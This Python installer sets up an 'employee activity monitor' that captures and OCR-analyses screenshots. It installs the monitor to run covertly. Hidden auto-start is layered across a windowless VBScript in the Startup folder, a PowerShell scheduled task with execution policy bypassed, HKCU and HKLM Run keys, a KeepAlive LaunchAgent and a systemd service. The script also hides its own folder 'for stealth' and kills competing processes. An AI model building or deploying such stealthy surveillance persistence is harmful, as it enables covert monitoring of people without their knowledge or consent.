#!/usr/bin/env python3
"""
Standalone installer - Downloads Python if not available and sets up the monitor.
Run with: python install_and_run.py
"""

import os
import sys
import subprocess
import urllib.request
import zipfile
import tempfile
import shutil
import json
import platform
import socket
import signal
from pathlib import Path

PYTHON_DOWNLOAD_URL = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
PYTHON_VERSION_MIN = (3, 8)
WINDOWS_ONLY_REQUIREMENTS = {"pywin32", "pypiwin32"}

def is_windows():
    return os.name == 'nt'

def is_macos():
    return sys.platform == 'darwin'

def is_linux():
    return sys.platform.startswith('linux')

def script_dir():
    return Path(__file__).resolve().parent

def _is_windows_store_python_stub(path_value):
    path_text = str(path_value or '').strip().lower()
    if not path_text:
        return False
    return 'windowsapps' in path_text and (path_text.endswith('python.exe') or path_text.endswith('python3.exe'))

def resolve_python_executable():
    runtime_python = str(Path(sys.executable).resolve()) if sys.executable else ''
    if runtime_python and not _is_windows_store_python_stub(runtime_python):
        return runtime_python

    which_python3 = shutil.which('python3')
    if which_python3 and not _is_windows_store_python_stub(which_python3):
        return which_python3

    which_python = shutil.which('python')
    if which_python and not _is_windows_store_python_stub(which_python):
        return which_python

    py_launcher = shutil.which('py')
    if py_launcher:
        return py_launcher

    return runtime_python or sys.executable


def resolve_monitor_python_executable(prefer_windowless=False):
    python_exec = Path(resolve_python_executable()).resolve()

    if is_windows() and prefer_windowless:
        pythonw_exec = python_exec.with_name('pythonw.exe')
        if pythonw_exec.exists():
            return str(pythonw_exec)

    return str(python_exec)

def cleanup_previous_package():
    package_dir = script_dir()
    package_names = {'employee-monitor-package', 'employeemonitorpackage'}
    current_pid = os.getpid()
    current_dir = package_dir.resolve()

    print("\n[INFO] Cleaning up any previous package run...")

    if is_windows():
        try:
            ps_script = rf"""
$currentPid = {current_pid}
Get-CimInstance Win32_Process |
  Where-Object {{
    $_.ProcessId -ne $currentPid -and (
      ($_.CommandLine -match 'install_and_run\.py') -or
      ($_.CommandLine -match 'monitor\.py') -or
      ($_.CommandLine -match 'employee-monitor-package')
    )
  }} |
  ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }}
"""
            subprocess.run(
                ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False
            )
        except Exception:
            pass
    else:
        try:
            ps_output = subprocess.check_output(['ps', '-eo', 'pid=,command='], text=True)
            for raw_line in ps_output.splitlines():
                line = raw_line.strip()
                if not line:
                    continue

                try:
                    pid_text, command_text = line.split(' ', 1)
                    pid = int(pid_text)
                except ValueError:
                    continue

                if pid == current_pid:
                    continue

                command_lower = command_text.lower()
                if (
                    'install_and_run.py' in command_lower or
                    'monitor.py' in command_lower or
                    'employee-monitor-package' in command_lower
                ):
                    try:
                        os.kill(pid, signal.SIGKILL)
                    except Exception:
                        pass
        except Exception:
            pass

    for child in package_dir.parent.iterdir():
        if not child.is_dir():
            continue

        try:
            if child.resolve() == current_dir:
                continue
        except Exception:
            pass

        child_name = child.name.strip().lower().replace(' ', '').replace('_', '').replace('-', '')
        if child_name in package_names:
            try:
                shutil.rmtree(child, ignore_errors=False)
                print(f"[OK] Removed previous package folder: {child}")
            except Exception as exc:
                print(f"[WARN] Could not remove {child}: {exc}")

    for stray_name in ('activity_data', 'activity_monitor.log'):
        stray_path = package_dir / stray_name
        if stray_path.is_dir():
            try:
                shutil.rmtree(stray_path, ignore_errors=False)
                print(f"[OK] Removed previous data folder: {stray_path}")
            except Exception as exc:
                print(f"[WARN] Could not remove {stray_path}: {exc}")
        elif stray_path.exists():
            try:
                stray_path.unlink()
                print(f"[OK] Removed previous file: {stray_path}")
            except Exception as exc:
                print(f"[WARN] Could not remove {stray_path}: {exc}")

def check_python():
    try:
        version = sys.version_info
        if version.major >= PYTHON_VERSION_MIN[0] and version.minor >= PYTHON_VERSION_MIN[1]:
            print(f"[OK] Python {version.major}.{version.minor}.{version.micro} detected")
            return True
    except:
        pass
    print("[!] Python 3.8+ required but not found")
    return False

def download_file(url, dest):
    def report_progress(block_num, block_size, total_size):
        downloaded = block_num * block_size
        percent = min(100, downloaded * 100 // total_size) if total_size > 0 else 0
        print(f"\r  Downloading... {percent}%", end='', flush=True)
    
    print(f"Downloading Python from {url}...")
    urllib.request.urlretrieve(url, dest, reporthook=report_progress)
    print("\n  Download complete!")

def install_python():
    if not is_windows():
        print("[ERROR] Python is required on this platform. Install Python 3 and rerun the installer.")
        return False

    print("\n[INFO] Python not found. Installing...")
    
    with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as tmp:
        installer_path = tmp.name
    
    try:
        download_file(PYTHON_DOWNLOAD_URL, installer_path)
        print("\n[INFO] Running Python installer...")
        print("  (This requires administrator privileges)")
        
        result = subprocess.run(
            [installer_path, '/quiet', 'InstallAllUsers=1', 'PrependPath=1', 'Include_test=0'],
            capture_output=True
        )
        
        if result.returncode == 0:
            print("[OK] Python installed successfully!")
            
            import ctypes
            import time
            for _ in range(10):
                if shutil.which('python'):
                    break
                time.sleep(1)
            
            return True
        else:
            print(f"[ERROR] Installation failed: {result.stderr.decode()}")
            return False
    finally:
        try:
            os.unlink(installer_path)
        except:
            pass




def install_requirements():
    print("\n[INFO] Installing required Python packages from requirements.txt...")
    try:
        requirements_path = script_dir() / 'requirements.txt'
        packages = []

        for raw_line in requirements_path.read_text(encoding='utf-8').splitlines():
            line = raw_line.strip()
            if not line or line.startswith('#'):
                continue

            package_name = line.split('[')[0].split('==')[0].split('>=')[0].split('<=')[0].split('~=')[0].strip().lower()
            if not is_windows() and package_name in WINDOWS_ONLY_REQUIREMENTS:
                continue

            packages.append(line)

        if packages:
            base_cmd = [sys.executable, '-m', 'pip', 'install', '-q', *packages]
            try:
                subprocess.check_call(
                    base_cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except Exception:
                if is_linux():
                    retry_cmd = [sys.executable, '-m', 'pip', 'install', '--break-system-packages', '-q', *packages]
                    subprocess.check_call(
                        retry_cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                else:
                    raise
        print("[OK] Packages installed successfully.")
    except Exception as e:
        print(f"[FAIL] {e}")
        return False

    if is_windows():
        print("\n[INFO] Running post-install for pywin32...")
        try:
            subprocess.check_call(
                [sys.executable, '-m', 'pywin32_postinstall', '-install'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            print("[WARN] pywin32 post-install step failed. Continuing.")
    
    # Post-install logic finished.
    return True


def try_install_tesseract_macos():
    """Try to install Tesseract on macOS using Homebrew."""
    print("[INFO] Tesseract not found. Trying to install on macOS...")
    
    if not shutil.which('brew'):
        print("[WARN] Homebrew is required to auto-install Tesseract on macOS.")
        print("       Please install Homebrew from https://brew.sh and re-run this installer.")
        return False
    
    try:
        print("[INFO] Installing Tesseract via Homebrew...")
        result = subprocess.run(['brew', 'install', 'tesseract'], capture_output=True, check=False, timeout=300)
        if result.returncode == 0:
            print("[OK] Tesseract installed successfully via Homebrew!")
            return True
        else:
            print("[WARN] Homebrew installation failed. You can try: brew install tesseract")
            return False
    except Exception as e:
        print(f"[ERROR] Failed to install via Homebrew: {e}")
        return False

def try_install_tesseract_linux():
    """Try to install Tesseract on Linux using package managers."""
    print("[INFO] Tesseract not found. Trying to install on Linux...")
    
    # Try different package managers
    if shutil.which('apt-get'):
        print("[INFO] Installing Tesseract via apt-get...")
        try:
            subprocess.run(['sudo', 'apt-get', 'update'], capture_output=True, check=False, timeout=120)
            result = subprocess.run(['sudo', 'apt-get', 'install', '-y', 'tesseract-ocr'], capture_output=True, check=False, timeout=300)
            if result.returncode == 0:
                print("[OK] Tesseract installed successfully!")
                return True
        except Exception as e:
            print(f"[WARN] apt-get installation failed: {e}")
    
    if shutil.which('dnf'):
        print("[INFO] Installing Tesseract via dnf...")
        try:
            result = subprocess.run(['sudo', 'dnf', 'install', '-y', 'tesseract'], capture_output=True, check=False, timeout=300)
            if result.returncode == 0:
                print("[OK] Tesseract installed successfully!")
                return True
        except Exception as e:
            print(f"[WARN] dnf installation failed: {e}")
    
    if shutil.which('yum'):
        print("[INFO] Installing Tesseract via yum...")
        try:
            result = subprocess.run(['sudo', 'yum', 'install', '-y', 'tesseract'], capture_output=True, check=False, timeout=300)
            if result.returncode == 0:
                print("[OK] Tesseract installed successfully!")
                return True
        except Exception as e:
            print(f"[WARN] yum installation failed: {e}")
    
    print("[WARN] Could not auto-install Tesseract. Please install manually and re-run.")
    return False

def download_tesseract_windows():
    """Download and install Tesseract-OCR from official GitHub releases."""
    print("[INFO] Downloading Tesseract OCR installer...")
    
    # Official Tesseract Windows installer
    tesseract_url = "https://github.com/UB-Mannheim/tesseract/releases/download/v5.4.0/tesseract-ocr-w64-setup-v5.4.0.exe"
    install_path = r"C:\Program Files\Tesseract-OCR"
    
    with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as tmp:
        installer_path = tmp.name
    
    try:
        # Download the installer
        print(f"  Downloading from: {tesseract_url}")
        
        def report_progress(block_num, block_size, total_size):
            if total_size > 0:
                downloaded = min(block_num * block_size, total_size)
                percent = (downloaded * 100) // total_size
                print(f"\r  Progress: {percent}%", end='', flush=True)
        
        urllib.request.urlretrieve(tesseract_url, installer_path, reporthook=report_progress)
        print("\n  Download complete!")
        
        # Run the installer silently
        print("[INFO] Running Tesseract installer (this may take a minute)...")
        result = subprocess.run(
            [installer_path, '/S', '/D=' + install_path],
            capture_output=True,
            check=False
        )
        
        if result.returncode == 0:
            print("[OK] Tesseract installed successfully!")
            # Wait a moment for the installation to complete
            import time
            time.sleep(2)
            return True
        else:
            stderr = result.stderr.decode() if result.stderr else ""
            print(f"[WARN] Installer reported an issue: {stderr}")
            # Still check if it was installed despite the return code
            if os.path.exists(os.path.join(install_path, 'tesseract.exe')):
                print("[OK] Tesseract appears to be installed despite installer warning.")
                return True
            return False
    except Exception as e:
        print(f"[ERROR] Failed to download/install Tesseract: {e}")
        return False
    finally:
        try:
            os.unlink(installer_path)
        except:
            pass

def try_install_tesseract_windows():
    print("[INFO] Tesseract not found. Trying automatic install on Windows...")

    # Check for bundled installer first (easiest for portable packages)
    bundled_installers = [
        script_dir() / 'tesseract-ocr-w64-setup-5.5.0.20241111.exe',
        script_dir() / 'tesseract-ocr-w64-setup-v5.4.0.exe',
        script_dir() / 'tesseract-ocr-w64-setup.exe',
    ]
    
    for installer_path in bundled_installers:
        if installer_path.exists():
            print(f"[INFO] Found bundled Tesseract installer: {installer_path.name}")
            print("[INFO] Running bundled Tesseract installer...")
            try:
                install_path = r"C:\Program Files\Tesseract-OCR"
                result = subprocess.run(
                    [str(installer_path), '/S', '/D=' + install_path],
                    capture_output=True,
                    check=False,
                    timeout=300
                )
                
                if result.returncode == 0 or os.path.exists(os.path.join(install_path, 'tesseract.exe')):
                    print("[OK] Tesseract installed from bundled installer!")
                    import time
                    time.sleep(2)
                    return True
            except Exception as e:
                print(f"[WARN] Bundled installer failed: {e}")
    
    # Try built-in package managers (fast if available)
    package_managers = [
        ['winget', 'install', '--id', 'UB-Mannheim.TesseractOCR', '-e', '--silent', '--accept-package-agreements', '--accept-source-agreements'],
        ['choco', 'install', 'tesseract', '-y']
    ]

    for cmd in package_managers:
        if not shutil.which(cmd[0]):
            continue
        try:
            print(f"[INFO] Trying to install with {cmd[0]}...")
            subprocess.run(cmd, check=False, timeout=120)
            # Re-check after each installer attempt.
            if check_tesseract(skip_auto_install=True):
                return True
        except Exception as e:
            print(f"[WARN] {cmd[0]} failed: {e}")
            continue

    # Fall back to downloading official installer
    print("[INFO] Package managers not available. Downloading official installer...")
    if download_tesseract_windows():
        return True

    return False

def check_tesseract(skip_auto_install=False):
    bundled_candidates = [
        script_dir() / 'tesseract' / 'tesseract.exe',
        script_dir() / 'tesseract' / 'bin' / 'tesseract',
        script_dir() / 'tesseract' / 'tesseract',
        script_dir() / 'Tesseract-OCR' / 'tesseract.exe',
        script_dir() / 'Tesseract-OCR' / 'bin' / 'tesseract',
        script_dir() / 'tesseract.exe'
    ]

    candidates = [
        os.environ.get('TESSERACT_CMD', '').strip(),
        shutil.which('tesseract'),
    ]

    for candidate in bundled_candidates:
        if candidate.exists():
            candidates.insert(0, str(candidate))
            break

    if is_windows():
        candidates.extend([
            r'C:\Program Files\Tesseract-OCR\tesseract.exe',
            r'C:\Program Files (x86)\Tesseract-OCR\tesseract.exe',
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Tesseract-OCR', 'tesseract.exe'),
        ])
    else:
        candidates.extend([
            '/opt/homebrew/bin/tesseract',
            '/usr/local/bin/tesseract',
            '/usr/bin/tesseract',
        ])

    for candidate in candidates:
        if candidate and os.path.exists(candidate):
            print(f"[OK] Tesseract found: {candidate}")
            return True

    if shutil.which('tesseract'):
        print(f"[OK] Tesseract found on PATH: {shutil.which('tesseract')}")
        return True

    if not skip_auto_install:
        if is_windows():
            if try_install_tesseract_windows():
                return True
        elif is_macos():
            if try_install_tesseract_macos():
                return True
        elif is_linux():
            if try_install_tesseract_linux():
                return True

    print("[ERROR] Tesseract OCR is required but was not found.")
    print("        The application cannot function without it for screenshot analysis.")
    return False


def setup_autostart():
    print("\n[INFO] Setting up hidden background auto-start...")

    monitor_path = script_dir() / 'monitor.py'
    python_bin = resolve_monitor_python_executable(prefer_windowless=False)

    if is_windows():
        startup_folder = os.path.join(os.environ.get('APPDATA', str(Path.home())), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        vbs_path = os.path.join(startup_folder, 'EmployeeMonitor.vbs')

        # VBScript executes pythonw (windowless python) fully hidden (0 flag)
        # Using specific environment variable definition solves Unicode logging crashes
        python_exec = resolve_monitor_python_executable(prefer_windowless=True)
        
        # Improved VBScript with better error handling and retry logic
        vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "{monitor_path.parent}"
Set colSystemEnvVars = WshShell.Environment("Process")
colSystemEnvVars("PYTHONIOENCODING") = "utf-8"

' Add a small delay to ensure system is fully initialized after boot
WScript.Sleep 2000

' Try to run the monitor with retry logic
Dim iRetries, iAttempt
iRetries = 3
For iAttempt = 1 To iRetries
    On Error Resume Next
    WshShell.Run Chr(34) & "{python_exec}" & Chr(34) & " " & Chr(34) & "{monitor_path}" & Chr(34), 0, False
    If Err.Number = 0 Then
        Exit For
    End If
    WScript.Sleep 1000
Next
On Error GoTo 0
'''

        vbs_ok = False
        task_ok = False
        run_key_ok = False

        try:
            Path(vbs_path).parent.mkdir(parents=True, exist_ok=True)
            with open(vbs_path, 'w', encoding='utf-16') as f:
                f.write(vbs_content)
            print(f"[OK] Background auto-start (VBS method) enabled: {vbs_path}")
            vbs_ok = True
        except Exception as e:
            print(f"[WARN] Could not create startup entry: {e}")

        # Add scheduled task - most reliable method for Windows
        try:
            task_name = 'EmployeeMonitorAutoStart'
            # Use ONLOGON trigger which fires when user logs in (after system restart)
            task_cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "& \'{{{python_exec}}}\' \'{{{monitor_path}}}\' 2>$null"'
            
            result = subprocess.run(
                ['schtasks', '/Create', '/SC', 'ONLOGON', '/RL', 'LIMITED', '/TN', task_name, '/TR', task_cmd, '/F', '/NP'],
                capture_output=True,
                text=True,
                check=False
            )
            if result.returncode == 0:
                print(f"[OK] Background auto-start (Task Scheduler) enabled: {task_name}")
                task_ok = True
            else:
                err = (result.stderr or result.stdout or '').strip()
                print(f"[WARN] Could not register scheduled task: {err}")
        except Exception as e:
            print(f"[WARN] Scheduled task setup failed: {e}")

        # Add HKCU Run registry entry - fallback if other methods blocked
        try:
            run_value = f'wscript.exe "{vbs_path}"'
            reg_result = subprocess.run(
                [
                    'reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
                    '/v', 'EmployeeMonitor',
                    '/t', 'REG_SZ',
                    '/d', run_value,
                    '/f'
                ],
                capture_output=True,
                text=True,
                check=False
            )
            if reg_result.returncode == 0:
                print('[OK] Background auto-start (Registry Run) enabled: HKCU\\...\\Run\\EmployeeMonitor')
                run_key_ok = True
            else:
                err = (reg_result.stderr or reg_result.stdout or '').strip()
                print(f"[WARN] Could not register HKCU Run startup value: {err}")
        except Exception as e:
            print(f"[WARN] Registry startup setup failed: {e}")
        
        # Also try HKLM for system-wide startup (requires admin)
        try:
            hklm_run_value = f'"{python_exec}" "{monitor_path}"'
            reg_result = subprocess.run(
                [
                    'reg', 'add', r'HKLM\Software\Microsoft\Windows\CurrentVersion\Run',
                    '/v', 'EmployeeMonitor',
                    '/t', 'REG_SZ',
                    '/d', hklm_run_value,
                    '/f'
                ],
                capture_output=True,
                text=True,
                check=False
            )
            if result.returncode == 0:
                print('[OK] Background auto-start (Registry HKLM) enabled: HKLM\\...\\Run\\EmployeeMonitor')
                run_key_ok = True
        except Exception:
            pass  # HKLM might fail if not admin - that's okay, user/local is sufficient

        success = vbs_ok or task_ok or run_key_ok
        
        if success:
            print("[OK] Auto-start configuration complete (multiple methods enabled for reliability)")
            print("     The monitor will automatically start when you log in or boot the system.")
        else:
            print("[WARN] Could not configure auto-start. Manual startup may be required.")
        
        return success

    if is_macos():
        launch_agents = Path.home() / 'Library' / 'LaunchAgents'
        launch_agents.mkdir(parents=True, exist_ok=True)
        plist_path = launch_agents / 'com.eyeing.monitor.plist'
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.eyeing.monitor</string>
  <key>ProgramArguments</key>
  <array>
    <string>{python_bin}</string>
    <string>{monitor_path}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
  <key>StartInterval</key>
  <integer>60</integer>
  <key>WorkingDirectory</key>
  <string>{monitor_path.parent}</string>
  <key>StandardErrorPath</key>
  <string>{Path.home()}/.employee-monitor-error.log</string>
  <key>StandardOutPath</key>
  <string>{Path.home()}/.employee-monitor-output.log</string>
</dict>
</plist>
'''
        plist_path.write_text(plist_content, encoding='utf-8')
        print(f"[OK] Background auto-start enabled for macOS: {plist_path}")
        return True

    if is_linux():
        monitor_python = resolve_monitor_python_executable(prefer_windowless=False)
        autostart_dir = Path.home() / '.config' / 'autostart'
        autostart_dir.mkdir(parents=True, exist_ok=True)
        desktop_path = autostart_dir / 'employee-monitor.desktop'
        desktop_content = f'''[Desktop Entry]
Type=Application
Name=Employee Monitor
Exec="{monitor_python}" "{monitor_path}"
Terminal=false
X-GNOME-Autostart-enabled=true
NoDisplay=true
'''
        desktop_path.write_text(desktop_content, encoding='utf-8')

        service_ok = False
        try:
            systemd_user_dir = Path.home() / '.config' / 'systemd' / 'user'
            systemd_user_dir.mkdir(parents=True, exist_ok=True)
            service_path = systemd_user_dir / 'employee-monitor.service'
            service_content = f'''[Unit]
Description=Employee Activity Monitor
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
WorkingDirectory={monitor_path.parent}
ExecStart={monitor_python} {monitor_path}
Restart=always
RestartSec=5
StandardOutput=append:{Path.home()}/.employee-monitor-output.log
StandardError=append:{Path.home()}/.employee-monitor-error.log

[Install]
WantedBy=default.target
'''
            service_path.write_text(service_content, encoding='utf-8')

            if shutil.which('systemctl'):
                subprocess.run(['systemctl', '--user', 'daemon-reload'], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['systemctl', '--user', 'enable', 'employee-monitor.service'], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['systemctl', '--user', 'restart', 'employee-monitor.service'], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[OK] Background auto-start enabled for Linux systemd user service: {service_path}")
            service_ok = True
        except Exception as e:
            print(f"[WARN] Could not configure Linux systemd user service: {e}")

        print(f"[OK] Background auto-start enabled for Linux desktop session: {desktop_path}")
        return service_ok or True

    print("[WARN] Auto-start is not configured for this platform.")
    return False

def protect_folder():
    print("\n[INFO] Applying folder hiding for stealth...")
    folder_path = os.path.abspath(os.path.dirname(__file__) or '.')

    if not is_windows():
        print("[INFO] Folder hiding is Windows-only; skipping on this platform.")
        return

    try:
        # Keep the folder hidden/system, but do not set deny-delete ACL.
        # Deny ACL slows down and can block complete remote uninstall.
        subprocess.run(['attrib', '+h', '+s', folder_path], capture_output=True, check=False)
        subprocess.run(['attrib', '+h', '+s', os.path.join(folder_path, '*'), '/s', '/d'], capture_output=True, check=False)
        
        print("[OK] Folder is hidden from standard view.")
        print("       (To reverse: run 'attrib -h -s .\\')")
    except Exception as e:
        print(f"[WARN] Could not apply folder protection: {e}")

def save_install_context():
    try:
        base = script_dir()
        data_dir = base / 'activity_data'
        data_dir.mkdir(parents=True, exist_ok=True)

        context = {
            'install_id': os.environ.get('INSTALL_ID', '').strip(),
            'device_id': os.environ.get('DEVICE_ID', '').strip() or os.environ.get('COMPUTERNAME', '').strip() or os.environ.get('HOSTNAME', '').strip() or socket.gethostname(),
            'backend_url': os.environ.get('BACKEND_URL', '').strip()
        }

        with open(data_dir / 'install_context.json', 'w', encoding='utf-8') as f:
            json.dump(context, f, indent=2)
        print('[OK] Saved install context for monitor identity resolution.')
    except Exception as e:
        print(f"[WARN] Could not save install context: {e}")

def main():
    print("=" * 60)
    print("  EMPLOYEE ACTIVITY MONITOR - INSTALLER")
    print("=" * 60)

    cleanup_previous_package()
    
    if not check_python():
        if is_windows() and '--no-install' not in sys.argv:
            install_python()
            print("\n[INFO] Please restart this script after Python installation.")
            input("Press Enter to exit...")
            sys.exit(0)

        if '--no-install' in sys.argv:
            print("\n[ERROR] Python is required. Please install from python.org")
            input("Press Enter to exit...")
            sys.exit(1)

        print("\n[ERROR] Python 3.8+ is required. Please install Python and rerun this installer.")
        sys.exit(1)
    
    if not install_requirements():
        input("Press Enter to exit...")
        sys.exit(1)

    if not check_tesseract():
        print("\n" + "=" * 60)
        print("  TESSERACT OCR INSTALLATION FAILED")
        print("=" * 60)
        print("\n[CRITICAL] Tesseract OCR is required but could not be installed.")
        print("This is required to capture and analyze screenshots.\n")
        print("MANUAL INSTALLATION OPTIONS:\n")
        
        if is_windows():
            print("1. Download from: https://github.com/UB-Mannheim/tesseract/releases")
            print("   Search for 'tesseract-ocr-w64-setup-v5.4.0.exe'")
            print("   Run the installer with default settings.\n")
            print("2. Or use a package manager:")
            print("   - Windows: choco install tesseract")
            print("   - Windows: winget install UB-Mannheim.TesseractOCR\n")
        else:
            print("1. macOS: brew install tesseract")
            print("2. Linux (Ubuntu/Debian): sudo apt-get install tesseract-ocr")
            print("3. Linux (Fedora/RHEL): sudo dnf install tesseract\n")
        
        print("After installing Tesseract, please re-run this installer.")
        input("Press Enter to exit...")
        sys.exit(1)
    
    save_install_context()
    
    if '--autostart' in sys.argv or os.environ.get('SETUP_AUTOSTART'):
        setup_autostart()
    
    # Apply folder hiding and deletion lock
    protect_folder()
    
    print("\n" + "=" * 60)
    print("  INSTALLATION COMPLETE!")
    print("=" * 60)
    print()
    
    if '--no-run' not in sys.argv:
        print("Starting monitor in the background...")
        print()
        
        os.chdir(str(script_dir()))

        if is_windows():
            # We start the monitor in the background via the startup VBScript
            startup_folder = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            vbs_path = os.path.join(startup_folder, 'EmployeeMonitor.vbs')

            if os.path.exists(vbs_path):
                try:
                    subprocess.Popen(['wscript.exe', vbs_path], shell=False)
                    print("[OK] Monitor has successfully started in the background!")
                    print("     It will continue running invisibly and restart automatically on PC boot.")
                except Exception as e:
                    print(f"[ERROR] Could not start hidden monitor: {e}")
            else:
                print("[WARN] VBScript not found. Running monitor directly (will attach to terminal)...")
                try:
                    subprocess.Popen([resolve_monitor_python_executable(prefer_windowless=True), 'monitor.py'])
                except Exception as e:
                    print(e)
        else:
            try:
                subprocess.Popen([resolve_monitor_python_executable(prefer_windowless=False), str(script_dir() / 'monitor.py')], cwd=str(script_dir()), start_new_session=True)
                print("[OK] Monitor has successfully started in the background!")
            except Exception as e:
                print(f"[ERROR] Could not start monitor: {e}")

if __name__ == '__main__':
    main()
